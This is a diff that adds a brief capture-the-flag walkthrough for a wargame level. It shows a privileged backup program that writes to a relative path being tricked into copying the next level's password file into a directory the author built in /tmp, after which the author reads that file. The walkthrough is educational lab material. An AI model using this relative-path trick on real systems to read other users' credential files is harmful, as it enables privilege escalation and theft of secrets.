@@ -1,0 +1,15 @@
+#this program takes a file as argument
+
+$ ./level08 ~level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+#so the program try to open a file ./backups//home/users/level09/.pass.
+#It's a relative path
+# so let's to create this path
+$ mkdir -p ./backups//home/users/level09
+mkdir: cannot create directory `./backups//home': Permission denied
+# let's try again in the /tmp
+$ cd /tmp
+$ mkdir -p ./backups//home/users/level09/
+#we call the program from /tmp
+$ ~/level08 ~level09/.pass
+$ cat backups/home/users/level09/.pass
